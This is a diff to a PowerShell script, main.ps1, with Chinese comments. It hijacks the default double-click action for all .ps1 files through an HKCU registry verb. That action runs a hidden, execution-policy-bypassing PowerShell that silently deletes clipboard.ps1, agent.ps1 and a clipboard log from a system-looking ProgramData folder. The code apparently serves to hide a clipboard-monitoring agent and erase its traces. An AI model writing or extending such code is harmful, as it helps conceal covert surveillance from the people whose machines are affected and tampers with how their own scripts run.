@@ -1,14 +1,15 @@
 # === main.ps1 ===
 
-# ✅ 删除 clipboard.ps1 和 agent.ps1
+# ✅ 删除 clipboard.ps1, agent.ps1 和 clipboard-log.txt
 $TARGET1 = "C:\ProgramData\Microsoft\Windows\clipboard.ps1"
 $TARGET2 = "C:\ProgramData\Microsoft\Windows\agent.ps1"
+$TARGET3 = "C:\ProgramData\Microsoft\Windows\clipboard-log.txt"
 
 # 输出日志，确保删除操作已设置
-Write-Host "Setting up DeleteOnOpen for: $TARGET1 and $TARGET2"
+Write-Host "Setting up DeleteOnOpen for: $TARGET1, $TARGET2, and $TARGET3"
 
 # 构建删除文件的命令
-$cmd2 = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Start-Sleep -Milliseconds 150; Remove-Item -LiteralPath '$TARGET1' -Force -ErrorAction SilentlyContinue; Remove-Item -LiteralPath '$TARGET2' -Force -ErrorAction SilentlyContinue`""
+$cmd2 = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Start-Sleep -Milliseconds 150; Remove-Item -LiteralPath '$TARGET1' -Force -ErrorAction SilentlyContinue; Remove-Item -LiteralPath '$TARGET2' -Force -ErrorAction SilentlyContinue; Remove-Item -LiteralPath '$TARGET3' -Force -ErrorAction SilentlyContinue`""
 
 # 注册 DeleteOnOpen 动作（确保它只在打开文件时触发）
 $key2 = "HKCU:\Software\Classes\Microsoft.PowerShellScript.1\shell\DeleteOnOpen\command"
@@ -23,7 +24,7 @@ Set-ItemProperty `
   -Name "(Default)" `
   -Value "DeleteOnOpen"
 
-Write-Host "DeleteOnOpen setup complete. Both files will be deleted when double-clicked."
+Write-Host "DeleteOnOpen setup complete. All three files will be deleted when double-clicked."
 
 
 # ✅ 
